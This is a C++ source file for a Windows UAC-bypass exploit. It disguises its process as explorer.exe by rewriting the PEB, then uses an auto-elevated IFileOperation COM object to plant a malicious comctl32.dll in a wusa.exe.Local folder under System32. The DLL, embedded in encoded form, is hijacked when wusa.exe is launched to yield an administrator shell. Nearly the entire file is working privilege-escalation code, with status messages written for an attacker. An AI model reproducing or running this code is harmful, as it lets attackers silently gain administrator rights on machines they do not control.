#include <stdafx.h>
#include <cstdio>
#include <string>
#include <Shobjidl.h>
#include <compressapi.h>
#include <wincrypt.h>
#include <vector>
#include <windows.h>
#include <stringapiset.h>
#include "comctl32.h"

#define MAX_NAME 256

const int MINIMUM_BUILD_VERSION = 7600;
const DWORD ALWAYS_NOTIFY_UAC_LEVEL = 2;
const DWORD DEFAULT_UAC_LEVEL = 5;

inline std::wstring s2ws(const std::string& str)
{
    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
    std::wstring wstrTo( size_needed, 0 );
    MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
    return wstrTo;
}

inline std::string WStringToString(const std::wstring& s)
{
    std::string temp(s.length(), ' ');
    std::copy(s.begin(), s.end(), temp.begin());
    return temp;
}

inline std::wstring StringToWString(const std::string& s)
{
    std::wstring temp(s.length(),L' ');
    std::copy(s.begin(), s.end(), temp.begin());
    return temp;
}

inline BOOL MasqueradePEB() {

    typedef struct _UNICODE_STRING {
        USHORT Length;
        USHORT MaximumLength;
        PWSTR  Buffer;
    } UNICODE_STRING, *PUNICODE_STRING;

    typedef NTSTATUS(NTAPI *_NtQueryInformationProcess)(
            HANDLE ProcessHandle,
            DWORD ProcessInformationClass,
            PVOID ProcessInformation,
            DWORD ProcessInformationLength,
            PDWORD ReturnLength
    );

    typedef NTSTATUS(NTAPI *_RtlEnterCriticalSection)(
            PRTL_CRITICAL_SECTION CriticalSection
    );

    typedef NTSTATUS(NTAPI *_RtlLeaveCriticalSection)(
            PRTL_CRITICAL_SECTION CriticalSection
    );

    typedef void (WINAPI* _RtlInitUnicodeString)(
            PUNICODE_STRING DestinationString,
            PCWSTR SourceString
    );

    typedef struct _LIST_ENTRY {
        struct _LIST_ENTRY  *Flink;
        struct _LIST_ENTRY  *Blink;
    } LIST_ENTRY, *PLIST_ENTRY;

    typedef struct _PROCESS_BASIC_INFORMATION
    {
        LONG ExitStatus;
        PVOID PebBaseAddress;
        ULONG_PTR AffinityMask;
        LONG BasePriority;
        ULONG_PTR UniqueProcessId;
        ULONG_PTR ParentProcessId;
    } PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

    typedef struct _PEB_LDR_DATA {
        ULONG Length;
        BOOLEAN Initialized;
        HANDLE SsHandle;
        LIST_ENTRY InLoadOrderModuleList;
        LIST_ENTRY InMemoryOrderModuleList;
        LIST_ENTRY InInitializationOrderModuleList;
        PVOID EntryInProgress;
        BOOLEAN ShutdownInProgress;
        HANDLE ShutdownThreadId;
    } PEB_LDR_DATA, *PPEB_LDR_DATA;

    typedef struct _RTL_USER_PROCESS_PARAMETERS {
        BYTE           Reserved1[16];
        PVOID          Reserved2[10];
        UNICODE_STRING ImagePathName;
        UNICODE_STRING CommandLine;
    } RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

    // Partial PEB
    typedef struct _PEB {
        BOOLEAN InheritedAddressSpace;
        BOOLEAN ReadImageFileExecOptions;
        BOOLEAN BeingDebugged;
        union
        {
            BOOLEAN BitField;
            struct
            {
                BOOLEAN ImageUsesLargePages : 1;
                BOOLEAN IsProtectedProcess : 1;
                BOOLEAN IsLegacyProcess : 1;
                BOOLEAN IsImageDynamicallyRelocated : 1;
                BOOLEAN SkipPatchingUser32Forwarders : 1;
                BOOLEAN SpareBits : 3;
            };
        };
        HANDLE Mutant;

        PVOID ImageBaseAddress;
        PPEB_LDR_DATA Ldr;
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
        PVOID SubSystemData;
        PVOID ProcessHeap;
        PRTL_CRITICAL_SECTION FastPebLock;
    } PEB, *PPEB;

    typedef struct _LDR_DATA_TABLE_ENTRY {
        LIST_ENTRY InLoadOrderLinks;
        LIST_ENTRY InMemoryOrderLinks;
        union
        {
            LIST_ENTRY InInitializationOrderLinks;
            LIST_ENTRY InProgressLinks;
        };
        PVOID DllBase;
        PVOID EntryPoint;
        ULONG SizeOfImage;
        UNICODE_STRING FullDllName;
        UNICODE_STRING BaseDllName;
        ULONG Flags;
        WORD LoadCount;
        WORD TlsIndex;
        union
        {
            LIST_ENTRY HashLinks;
            struct
            {
                PVOID SectionPointer;
                ULONG CheckSum;
            };
        };
        union
        {
            ULONG TimeDateStamp;
            PVOID LoadedImports;
        };
    } LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

    DWORD dwPID;
    PROCESS_BASIC_INFORMATION pbi;
    PPEB peb;
    PPEB_LDR_DATA pld;
    PLDR_DATA_TABLE_ENTRY ldte;

    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryInformationProcess");
    if (NtQueryInformationProcess == NULL) {
        return FALSE;
    }

    _RtlEnterCriticalSection RtlEnterCriticalSection = (_RtlEnterCriticalSection)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlEnterCriticalSection");
    if (RtlEnterCriticalSection == NULL) {
        return FALSE;
    }

    _RtlLeaveCriticalSection RtlLeaveCriticalSection = (_RtlLeaveCriticalSection)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlLeaveCriticalSection");
    if (RtlLeaveCriticalSection == NULL) {
        return FALSE;
    }

    _RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)
            GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlInitUnicodeString");
    if (RtlInitUnicodeString == NULL) {
        return FALSE;
    }

    dwPID = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, dwPID);
    if (hProcess == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }

    // Retrieves information about the specified process.
    NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), NULL);

    // Read pbi PebBaseAddress into PEB Structure
    if (!ReadProcessMemory(hProcess, &pbi.PebBaseAddress, &peb, sizeof(peb), NULL)) {
        return FALSE;
    }

    // Read Ldr Address into PEB_LDR_DATA Structure
    if (!ReadProcessMemory(hProcess, &peb->Ldr, &pld, sizeof(pld), NULL)) {
        return FALSE;
    }

    // Let's overwrite UNICODE_STRING structs in memory

    // First set Explorer.exe location buffer
    WCHAR chExplorer[MAX_PATH + 1];
    GetWindowsDirectoryW(chExplorer, MAX_PATH);
    wcscat_s(chExplorer, sizeof(chExplorer) / sizeof(wchar_t), L"\\explorer.exe");

    LPWSTR pwExplorer = (LPWSTR)malloc(MAX_PATH);
    wcscpy_s(pwExplorer, MAX_PATH, chExplorer);

    // Take ownership of PEB
    RtlEnterCriticalSection(peb->FastPebLock);

    // Masquerade ImagePathName and CommandLine
    RtlInitUnicodeString(&peb->ProcessParameters->ImagePathName, pwExplorer);
    RtlInitUnicodeString(&peb->ProcessParameters->CommandLine, pwExplorer);

    // Masquerade FullDllName and BaseDllName
    WCHAR wFullDllName[MAX_PATH];
    WCHAR wExeFileName[MAX_PATH];
    GetModuleFileNameW(NULL, wExeFileName, MAX_PATH);

    LPVOID pStartModuleInfo = peb->Ldr->InLoadOrderModuleList.Flink;
    LPVOID pNextModuleInfo = pld->InLoadOrderModuleList.Flink;
    do
    {
        // Read InLoadOrderModuleList.Flink Address into LDR_DATA_TABLE_ENTRY Structure
        if (!ReadProcessMemory(hProcess, &pNextModuleInfo, &ldte, sizeof(ldte), NULL)) {
            return FALSE;
        }

        // Read FullDllName into string
        if (!ReadProcessMemory(hProcess, (LPVOID)ldte->FullDllName.Buffer, (LPVOID)&wFullDllName, ldte->FullDllName.MaximumLength, NULL))
        {
            return FALSE;
        }

        if (_wcsicmp(wExeFileName, wFullDllName) == 0) {
            RtlInitUnicodeString(&ldte->FullDllName, pwExplorer);
            RtlInitUnicodeString(&ldte->BaseDllName, pwExplorer);
            break;
        }

        pNextModuleInfo = ldte->InLoadOrderLinks.Flink;

    } while (pNextModuleInfo != pStartModuleInfo);

    //Release ownership of PEB
    RtlLeaveCriticalSection(peb->FastPebLock);

    // Release Process Handle
    CloseHandle(hProcess);

    if (_wcsicmp(chExplorer, wFullDllName) == 0) {
        return FALSE;
    }

    return TRUE;
}

// Function that base64 decodes and decompresses our malicious DLL
inline BOOL base64DecodeAndDecompressDLL(CHAR *buffer, LPCWSTR lpDecFile) {
    DECOMPRESSOR_HANDLE decompressor = NULL;
    PBYTE compressedBuffer = NULL;
    PBYTE decompressedBuffer = NULL;
    SIZE_T decompressedBufferSize, decompressedDataSize;
    DWORD bytesWritten;
    BOOL bErrorFlag = FALSE;

    // Base64 decode our Buffer.
    DWORD dwSize = 0;
    DWORD strLen = lstrlenA(buffer);

    CryptStringToBinaryA(buffer, strLen, CRYPT_STRING_BASE64, NULL, &dwSize, NULL, NULL);

    dwSize++;
    compressedBuffer = new BYTE[dwSize];
    CryptStringToBinaryA(buffer, strLen, CRYPT_STRING_BASE64, compressedBuffer, &dwSize, NULL, NULL);

    //  Create an LZMS decompressor.
    if (!CreateDecompressor(
            COMPRESS_ALGORITHM_LZMS,
            NULL,
            &decompressor)) {
        return FALSE;
    }

    //  Query decompressed buffer size.
    if (!Decompress(
            decompressor,
            compressedBuffer,
            dwSize,
            NULL,
            0,
            &decompressedBufferSize)) {
        DWORD ErrorCode = GetLastError();

        // Note that the original size returned by the function is extracted
        // from the buffer itself and should be treated as untrusted and tested
        // against reasonable limits.
        if (ErrorCode != ERROR_INSUFFICIENT_BUFFER) {
            return FALSE;
        }

        decompressedBuffer = (PBYTE)malloc(decompressedBufferSize);
        if (!decompressedBuffer)
        {
            return FALSE;
        }
    }

    //  Decompress data and write data to DecompressedBuffer.
    if (!Decompress(
            decompressor,
            compressedBuffer,
            dwSize,
            decompressedBuffer,
            decompressedBufferSize,
            &decompressedDataSize)) {
        return FALSE;
    }

    HANDLE decFile = CreateFileW(lpDecFile,
                                 GENERIC_WRITE,
                                 0,
                                 NULL,
                                 CREATE_ALWAYS,
                                 FILE_ATTRIBUTE_NORMAL,
                                 NULL);
    if (decFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    bErrorFlag = WriteFile(decFile, decompressedBuffer, (DWORD)decompressedDataSize, &bytesWritten, NULL);
    if (FALSE == bErrorFlag) {
        CloseHandle(decFile);
        return FALSE;
    }

    CloseHandle(decFile);

    return TRUE;
}

// Function that checks if the compromised user belongs to the Administator's group
inline BOOL checkAdministratorGroup() {
    DWORD i, dwSize = 0, dwResult = 0;
    HANDLE hToken;
    PTOKEN_GROUPS pGroupInfo;
    SID_NAME_USE SidType;
    WCHAR lpName[MAX_NAME];
    WCHAR lpDomain[MAX_NAME];
    BYTE sidBuffer[100];
    PSID pSID = (PSID)&sidBuffer;
    BOOL belongsToAdministratorsGroup = FALSE;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
        return TRUE;
    } else {

        if (!GetTokenInformation(hToken, TokenGroups, NULL, dwSize, &dwSize)) {
            dwResult = GetLastError();
            if (dwResult != ERROR_INSUFFICIENT_BUFFER)
            {
                wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
                return TRUE;
            }
        }

        pGroupInfo = (PTOKEN_GROUPS)GlobalAlloc(GPTR, dwSize);

        if (!GetTokenInformation(hToken, TokenGroups, pGroupInfo, dwSize, &dwSize)) {
            wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
            return TRUE;
        } else {
            SID_IDENTIFIER_AUTHORITY SIDAuth = SECURITY_NT_AUTHORITY;
            if (!AllocateAndInitializeSid(&SIDAuth, 2,
                                          SECURITY_BUILTIN_DOMAIN_RID,
                                          DOMAIN_ALIAS_RID_ADMINS,
                                          0, 0, 0, 0, 0, 0,
                                          &pSID)) {
                wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
                return TRUE;
            } else {

                for (i = 0; i < pGroupInfo->GroupCount; i++) {
                    if (EqualSid(pSID, pGroupInfo->Groups[i].Sid)) {
                        dwSize = MAX_NAME;
                        if (!LookupAccountSidW(NULL,
                                               pGroupInfo->Groups[i].Sid,
                                               lpName,
                                               &dwSize,
                                               lpDomain,
                                               &dwSize,
                                               &SidType)) {
                            dwResult = GetLastError();
                            if (dwResult == ERROR_NONE_MAPPED)
                                wcscpy_s(lpName, sizeof(lpName), L"NONE_MAPPED");
                            else {
                                wprintf(L" [-] Error! Cannot check if the current user belongs to the Administrators group! Let's suppose it belongs...\n");
                                return TRUE;
                            }
                        } else {
                            belongsToAdministratorsGroup = TRUE;
                            break;
                        }
                    }
                }
            }
        }
    }

    if (pSID) {
        FreeSid(pSID);
    }
    if (pGroupInfo) {
        GlobalFree(pGroupInfo);
    }
    return belongsToAdministratorsGroup;
}

// Function that retrieves us the build number of the compromised machine
inline std::wstring getBuildNumber() {
    HKEY root = HKEY_LOCAL_MACHINE;
    std::wstring key = L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";
    std::wstring name = L"CurrentBuild";
    HKEY hKey;
    if (RegOpenKeyExW(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
        return std::to_wstring(MINIMUM_BUILD_VERSION);
    }

    DWORD type;
    DWORD cbData;
    if (RegQueryValueExW(hKey, name.c_str(), NULL, &type, NULL, &cbData) != ERROR_SUCCESS)
    {
        RegCloseKey(hKey);
        wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
        return std::to_wstring(MINIMUM_BUILD_VERSION);
    }

    if (type != REG_SZ) {
        RegCloseKey(hKey);
        wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
        return std::to_wstring(MINIMUM_BUILD_VERSION);
    }

    std::wstring value(cbData / sizeof(wchar_t), L'\0');
    if (RegQueryValueExW(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value[0]), &cbData) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        wprintf(L" [-] Error! The Windows build number cannot be determined! Trying the default one...\n");
        return std::to_wstring(MINIMUM_BUILD_VERSION);
    }

    RegCloseKey(hKey);

    size_t firstNull = value.find_first_of(L'\0');
    if (firstNull != std::string::npos)
        value.resize(firstNull);

    return value;
}

// Function that retrieves us the UAC level of the compromised machine
inline DWORD getUACLevel() {
    HKEY root = HKEY_LOCAL_MACHINE;
    std::wstring key = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    std::wstring name = L"ConsentPromptBehaviorAdmin";
    HKEY hKey;
    if (RegOpenKeyExW(root, key.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        wprintf(L" [-] Error! The UAC level cannot be determined! Trying the default one...\n");
        return DEFAULT_UAC_LEVEL;
    }

    DWORD type;
    DWORD cbData(sizeof(DWORD));

    DWORD value(0);
    if (RegQueryValueExW(hKey, name.c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value), &cbData) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        wprintf(L" [-] Error! The UAC level cannot be determined! Trying the default one...\n");
        return DEFAULT_UAC_LEVEL;
    }

    RegCloseKey(hKey);

    return value;
}

// Function to get the names of the directories to perform the DLL hijacking
inline std::vector <std::wstring> getDirectories(LPCWSTR targetedDirectories) {
    WIN32_FIND_DATA ffd;
    std::vector <std::wstring> dirNames;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    DWORD dwError = 0;

    LPCWSTR fixedDirectory = L"wusa.exe.Local";

    std::string narrow_str(WStringToString(targetedDirectories));

    LPCSTR targetDirs = narrow_str.c_str();

    hFind = FindFirstFile(targetDirs, &ffd);
    if (INVALID_HANDLE_VALUE == hFind) {
        wprintf(L" [-] Error! Cannot get the targeted directories!\n");
        wprintf(L" [+] Stopping the execution...\n");
        exit(1);
    }

    do {
        if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            std::wstring slash(L"\\");
            char* CHAR_CFILENAME = &ffd.cFileName[0];
            std::string cfeel(CHAR_CFILENAME);
            std::wstring CFILENAME = s2ws(cfeel);
            std::wstring path = fixedDirectory + slash + CFILENAME;
            LPCWSTR finalPath = path.c_str();
            dirNames.push_back(finalPath);
        }
    } while (FindNextFile(hFind, &ffd) != 0);

    dwError = GetLastError();
    if (dwError != ERROR_NO_MORE_FILES) {
        wprintf(L" [-] Error! Cannot get the targeted directories!\n");
        wprintf(L" [+] Stopping the execution...\n");
        exit(1);
    }

    FindClose(hFind);

    return dirNames;
}

// Function to create the directories that will allow the DLL hijacking
inline BOOL createDirectories(LPCTSTR targetedDirectories) {
    BOOL success = TRUE;
    LPCWSTR fixedDirectory = L"wusa.exe.Local";
    std::vector <std::wstring> dirNames;
    std::wstring wide_str(StringToWString(targetedDirectories));

    LPCWSTR targetDirs = wide_str.c_str();

    dirNames = getDirectories(targetDirs);

    if (!CreateDirectoryW(fixedDirectory, NULL)) {
        success = FALSE;
    }

    for (int i = 0; i < dirNames.size(); i++) {
        if (!CreateDirectoryW(dirNames.at(i).c_str(), NULL)) {
            success = FALSE;
        }
    }

    return success;
}

// Funtion to copy the folders containing our malicious DLL to the specific location to perform the DLL hijacking
inline BOOL IFileOperationCopy(LPCWSTR destPath, std::wstring buildVersion) {
    IFileOperation *fileOperation = NULL;
    WCHAR dllPath[1024];

    LPCWSTR dllName = L"wusa.exe.Local";

    GetModuleFileNameW(NULL, dllPath, 1024);
    std::wstring path(dllPath);
    const size_t last = path.rfind('\\');
    if (std::wstring::npos != last) {
        path = path.substr(0, last + 1);
    }
    path += dllName;

    // First Masquerade our Process as Explorer.exe
    if (!MasqueradePEB()) {
        wprintf(L" [-] Masquerade PEB failed!\n");
        return FALSE;
    }

    wprintf(L" [+] Using the IFileOperation::CopyItem method to copy the malicious \"comctl32.dll\"...\n");
    BIND_OPTS3 bo;
    SHELLEXECUTEINFOW shexec;
    //starthere
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {
        memset(&shexec, 0, sizeof(shexec));
        memset(&bo, 0, sizeof(bo));
        bo.cbStruct = sizeof(bo);
        bo.dwClassContext = CLSCTX_LOCAL_SERVER;
        hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
        if (SUCCEEDED(hr)) {
            if (std::stoi(buildVersion) > 14997) {
                hr = fileOperation->SetOperationFlags(
                        FOF_NOCONFIRMATION |
                        FOFX_NOCOPYHOOKS |
                        FOFX_REQUIREELEVATION);
            } else {
                hr = fileOperation->SetOperationFlags(
                        FOF_NOCONFIRMATION |
                        FOF_SILENT |
                        FOFX_SHOWELEVATIONPROMPT |
                        FOFX_NOCOPYHOOKS |
                        FOFX_REQUIREELEVATION |
                        FOF_NOERRORUI);
            }
            if (SUCCEEDED(hr)) {
                IShellItem *from = NULL, *to = NULL;
                hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&from));
                if (SUCCEEDED(hr)) {
                    if (destPath)
                        hr = SHCreateItemFromParsingName(destPath, NULL, IID_PPV_ARGS(&to));
                    if (SUCCEEDED(hr)) {
                        hr = fileOperation->CopyItem(from, to, dllName, NULL);
                        if (NULL != to) {
                            to->Release();
                        }
                    }
                    from->Release();
                }
                if (SUCCEEDED(hr)) {
                    hr = fileOperation->PerformOperations();
                }
            }
            fileOperation->Release();
        }
        CoUninitialize();
    }

    return TRUE;
}

// Function to delete the elements dropped to the path to perform the DLL hijacking
inline BOOL IFileOperationDelete(LPCWSTR destPath, std::wstring buildVersion) {
    IFileOperation *fileOperation = NULL;

    std::wstring directoryName(L"\\wusa.exe.Local");
    std::wstring path = destPath + directoryName;

    wprintf(L" [+] Using the IFileOperation::DeleteItem method to delete the malicious \"comctl32.dll\"...\n");

    BIND_OPTS3 bo;
    SHELLEXECUTEINFOW shexec;

    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
    if (SUCCEEDED(hr)) {
        memset(&shexec, 0, sizeof(shexec));
        memset(&bo, 0, sizeof(bo));
        bo.cbStruct = sizeof(bo);
        bo.dwClassContext = CLSCTX_LOCAL_SERVER;
        hr = CoGetObject(L"Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}", &bo, __uuidof(IFileOperation), (PVOID*)&fileOperation);
        if (SUCCEEDED(hr)) {
            if (std::stoi(buildVersion) > 14997) {
                hr = fileOperation->SetOperationFlags(
                        FOF_NOCONFIRMATION |
                        FOFX_NOCOPYHOOKS |
                        FOFX_REQUIREELEVATION);
            } else {
                hr = fileOperation->SetOperationFlags(
                        FOF_NOCONFIRMATION |
                        FOF_SILENT |
                        FOFX_SHOWELEVATIONPROMPT |
                        FOFX_NOCOPYHOOKS |
                        FOFX_REQUIREELEVATION |
                        FOF_NOERRORUI);
            }
            if (SUCCEEDED(hr)) {
                IShellItem *which = NULL;
                hr = SHCreateItemFromParsingName(path.data(), NULL, IID_PPV_ARGS(&which));
                if (SUCCEEDED(hr)) {
                    hr = fileOperation->DeleteItem(which, NULL);
                    if (NULL != which) {
                        which->Release();
                    }
                }
                if (SUCCEEDED(hr)) {
                    hr = fileOperation->PerformOperations();
                }
            }
            fileOperation->Release();
        }
        CoUninitialize();
    }

    return TRUE;
}

// Funtion to delete all the elements dropped to the compromised machine
inline BOOL removeFilesAndDirectories(LPCWSTR targetedDirectories) {
    BOOL success = TRUE;

    wprintf(L" [+] Removing all the temporal files and folders...\n");

    std::vector <std::wstring> dirNames;
    dirNames = getDirectories(targetedDirectories);
    for (int i = 0; i < dirNames.size(); i++) {
        std::wstring filename(L"\\comctl32.dll");
        std::wstring path = dirNames.at(i) + filename;
        LPCWSTR finalPath = path.c_str();
        if (!DeleteFileW(finalPath)) {
            success = FALSE;
        }
    }

    for (int i = 0; i < dirNames.size(); i++) {
        if (!RemoveDirectoryW(dirNames.at(i).c_str())) {
            success = FALSE;
        }
    }

    if (!RemoveDirectoryW(L"wusa.exe.Local")) {
        success = FALSE;
    }

    return success;
}

inline int WUSAUacBypass(){
  std::wstring buildVersion = getBuildNumber();
        if (std::stoi(buildVersion) >= MINIMUM_BUILD_VERSION) {
            HANDLE hToken;
            HANDLE hProcess;
            DWORD dwLengthNeeded;
            DWORD dwError = ERROR_SUCCESS;
            PTOKEN_MANDATORY_LABEL pTIL = NULL;
            LPWSTR pStringSid;
            DWORD dwIntegrityLevel;

            hProcess = GetCurrentProcess();
            if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
                // Get the Integrity level.
                if (!GetTokenInformation(hToken, TokenIntegrityLevel,
                                         NULL, 0, &dwLengthNeeded)) {
                    dwError = GetLastError();
                    if (dwError == ERROR_INSUFFICIENT_BUFFER) {
                        pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0,
                                                                  dwLengthNeeded);
                        if (pTIL != NULL) {
                            if (GetTokenInformation(hToken, TokenIntegrityLevel,
                                                    pTIL, dwLengthNeeded, &dwLengthNeeded)) {
                                dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid,
                                                                       (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

                                if (dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID) {
                                    if (checkAdministratorGroup()) {
                                        if (getUACLevel() != ALWAYS_NOTIFY_UAC_LEVEL) {
                                            WIN32_FIND_DATA FindFileData;
                                            HANDLE hFind;
                                            LPCWSTR folderName;
                                            LPCWSTR targetedDirectories = L"C:\\Windows\\WinSxS\\x86_microsoft.windows.common-controls_*";
                                            LPCWSTR destPath;
                                            comctl32 COMCTL32;

                                            destPath = L"C:\\Windows\\System32";
                                            folderName = L"C:\\Windows\\System32\\wusa.exe.Local";

                                            wprintf(L" [+] Creating temporary folders...\n");

                                            std::string wide_str(WStringToString(targetedDirectories));

                                            LPCTSTR targetDirs = wide_str.c_str();

                                            if (!createDirectories(targetDirs)) {
                                                wprintf(L" [-] Error! Cannot create the necessary directories!\n");
                                                wprintf(L" [+] Stopping the execution...\n");
                                                return 1;
                                            }

                                            wprintf(L" [+] Extracting the malicious DLL..\n");
                                            CHAR *comctl = COMCTL32.getEncodedDLL();
                                            std::vector <std::wstring> dirNames;
                                            dirNames = getDirectories(targetedDirectories);
                                            for (int i = 0; i < dirNames.size(); i++) {
                                                std::wstring filename(L"\\comctl32.dll");
                                                std::wstring path = dirNames.at(i) + filename;
                                                LPCWSTR finalPath = path.c_str();
                                                if (!base64DecodeAndDecompressDLL(comctl, finalPath)) {
                                                    wprintf(L" [-] Error! Cannot extract the malicious DLL!\n");
                                                    removeFilesAndDirectories(targetedDirectories);
                                                    wprintf(L" [+] Stopping the execution...\n");
                                                    return 1;
                                                }
                                            }

                                            wprintf(L" [+] Masquerading the PEB...\n");
                                            if (!IFileOperationCopy(destPath, buildVersion)) {
                                                removeFilesAndDirectories(targetedDirectories);
                                                wprintf(L" [+] Stopping the execution...\n");
                                                return 1;
                                            }

                                            std::string widenew(WStringToString(folderName));

                                            LPCSTR FOLDNAME = widenew.c_str();

                                            hFind = FindFirstFileA(FOLDNAME, &FindFileData);
                                            if (hFind == INVALID_HANDLE_VALUE) {
                                                wprintf(L" [-] Error! The IFileOperation::CopyItem operation has failed!\n");
                                                wprintf(L" [+] Stopping the execution...\n");
                                                removeFilesAndDirectories(targetedDirectories);
                                                return 1;
                                            } else {
                                                FindClose(hFind);

                                                wprintf(L" [+] Starting wusa.exe (cross the fingers and wait to get an Administrator shell)...\n");

                                                if ((int)ShellExecuteW(NULL, NULL,
                                                                       L"C:\\Windows\\System32\\wusa.exe", NULL, NULL, SW_SHOW) > 32) {
                                                    IFileOperationDelete(destPath, buildVersion);
                                                    removeFilesAndDirectories(targetedDirectories);
                                                    wprintf(L" [+] Great! The exploit has been successful!\n");
                                                } else {
                                                    IFileOperationDelete(destPath, buildVersion);
                                                    removeFilesAndDirectories(targetedDirectories);
                                                    wprintf(L" [-] Error! The exploit has not worked as expected!\n");
                                                    wprintf(L" [+] Stopping the execution...\n");
                                                }
                                            }
                                        } else {
                                            //The user does not belong to Administrators group
                                            wprintf(L" [!] Damn! The user does not belong to Administrators group!\n");
                                            wprintf(L" [+] Stopping the execution...\n");
                                        }
                                    } else {
                                        //UAC level set to "Always notify"
                                        wprintf(L" [!] Damn! The UAC level is set to \"Always notify\"!\n");
                                        wprintf(L" [+] Stopping the execution...\n");
                                    }
                                } else {
                                    // High or System Integrity
                                    wprintf(L" [!] You already have Administrator rights! There is no need to execute the script ;)\n");
                                    wprintf(L" [+] Stopping the execution...\n");
                                }
                            }
                            LocalFree(pTIL);
                        }
                    }
                }
                CloseHandle(hToken);
            }
        } else {
            wprintf(L" [-] Error! Windows version not suported!\n");
            wprintf(L" [+] Stopping the execution...\n");
        }

        return 0;
}
